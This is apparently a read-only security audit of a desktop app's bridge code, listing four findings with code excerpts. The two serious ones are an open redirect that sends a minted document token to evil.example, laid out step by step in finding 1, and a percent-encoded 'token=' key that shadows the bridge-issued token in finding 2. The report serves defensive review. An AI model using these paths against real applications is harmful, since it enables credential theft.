# Bridge trust hunt — `src/bridge/`

Read-only hunt. Scope: accessibility and document-serving code, focused on what the
bridge accepts from the page/URL. Line numbers are from HEAD `356ea2a`.

## Count

4 findings (1 high, 1 medium, 2 low). Worst is finding 1.

## 1. Worst — the seed-token redirect builds its `Location` from the raw request path,
 leaking a freshly minted document token to a foreign origin

`src/bridge/server/handler.ts:87-94`

```ts
if (seeds.has(presented) && origin === null) {
    const documentToken = mintDocumentToken(ledger, label);
    const location = new URL(request.url);
    location.searchParams.set(TOKEN_PARAM, documentToken);
    return new Response(null, {
        status: 302,
        headers: { location: `${location.pathname}${location.search}${location.hash}` },
    });
}
```

`location.pathname` is copied byte-exact into a relative `Location`. A path starting
with `//` is a protocol-relative URL: `//evil.example/x?token=<docToken>` resolves to
`http://evil.example/x?token=<docToken>`. The credential minted on line 88 is handed
to that host. No canonical-path or authority check sits between the pathname and the
redirect header.

How it is reached, with no seed in the page's hands:

1. A page calls `window.create({ url: location.origin + "//evil.example/x", label: "child" })`.
2. `src/plugins/window-create.ts:57` treats the absolute URL as bridge-owned
   (`isBridgeOrigin` in `src/bridge/window-identity.ts:89-96` compares origins), so
   `appDocument()` at `:61-71` keeps the `//evil.example/x` path, strips `window=`,
   and appends the process token with `src/bridge/window-identity.ts:147-159`
   (`currentBridgeToken()` is the seed in a built app; `src/runtime.ts:134`).
3. The WebView navigates to `http://127.0.0.1:<port>//evil.example/x?token=<seed>` —
   a top-level GET, so `Origin` is null, and the seed is a member of `seeds`.
4. The branch above mints a document token and 302s to
   `//evil.example/x?token=<docToken>`; the WebView follows it off-origin.

The minted token is bound to `undefined` (the `window=` param was stripped), so under
a configured capability table it grants nothing; with the default open table it
grants everything, and it is a live bearer credential until the 256-token ledger
evicts it. The edge is the redirect target, not the capability gate.

## 2. Percent-encoded `token=` shadows the bridge-issued token

`src/bridge/window-identity.ts:154-158`

```ts
const kept = search
    .split("&")
    .filter((pair) => pair.length > 0 && !pair.startsWith(`${TOKEN_PARAM}=`));
kept.push(`${TOKEN_PARAM}=${encodeURIComponent(token)}`);
```

`withToken` filters the literal prefix `token=`. Its reader,
`tokenFromSearch` at `:132-137`, uses `URLSearchParams.get("token")`, which decodes
keys. The two disagree: a page-supplied `%74oken=<value>` survives the filter, and
because it is first in the query, `get("token")` returns it — not the token the
bridge appended. The sibling module knows this trap and decodes keys for `window=`
(`src/bridge/window-query.ts:29-42`), with a test at
`src/bridge/window-identity.test.ts:60-70`; no equivalent exists for `token=`.

How it is reached: `window.create({ url: "/x?%74oken=stale" })` from a page, or an
app-configured `window.url` carrying an encoded token key
(`src/app-loop.ts:47-61`). Result URL is `...?%74oken=stale&token=<seed>`; the
document request presents `stale`, so the window 401s. If the shadow value is a
valid token the page already holds, the new document is served under that token's
authority instead of a fresh one. Either way the invariant stated at
`src/bridge/window-identity.ts:38-39` — the bridge defines the credential — does not
hold for encoded spellings.

## 3. `crust.a11y` throws on a malformed selector instead of returning a refusal

`src/bridge/client/a11y-page.ts:156` and `:128`

```ts
const el = d.querySelector(sel);      // line 156, not in a try
...
: d.querySelector(rootSelector);      // line 128, not in a try
```

`d.querySelector` throws `DOMException` (SyntaxError) for invalid CSS such as `[` or
`:bad(`. The module defines `PageA11yRefusal` codes `bad-request` and `handler-error`
(`src/bridge/client/a11y-page-types.ts:16-20`) and wraps `el.focus()` in a try/catch
at `:161-170`, but neither selector call is guarded, so the public page API rejects
with a raw exception instead of the structured answer every other failure path
returns. Reached by any page script calling `crust.a11y.focusElement("[")` or
`crust.a11y.pageTree("[")`. Page-local only — no cross-origin escalation — but it
breaks the API's own error contract.

## 4. `pageTree` walks the DOM with no node or depth cap

`src/bridge/client/a11y-page.ts:136-145`

```ts
const walk = (el: any): void => {
    nodes.push(describe(el, order++));
    const kids = el?.children;
    if (kids && typeof kids.length === "number") {
        for (let i = 0; i < kids.length; i++) walk(kids[i]);
    }
};
walk(root);
```

No cap on `nodes.length` or recursion depth. `crust.a11y.pageTree("html")` on a large
page synchronously builds an unbounded array and can exhaust the page's main thread
or stack. Reached by any page script; the `note` at `:26-28` correctly limits the
*claim* (DOM, not OS AX tree) but there is no limit on the work.

## Intentional trust surface, not counted

`src/bridge/server/handler.ts:96-101` serves a document for a non-seed token with
`windowLabel` read from the request's `?window=`, and
`src/bridge/server/document-tokens.ts:43-50` mints a seed navigation's token bound to
that same URL label. Authority for invoke stays bound to the token
(`src/bridge/server/invoke.ts:41-43`), so a page can only mislabel itself; this is
blessed by `src/bridge/capability-binding.test.ts:119-160`. Listed so it is not
mistaken for an untracked path.
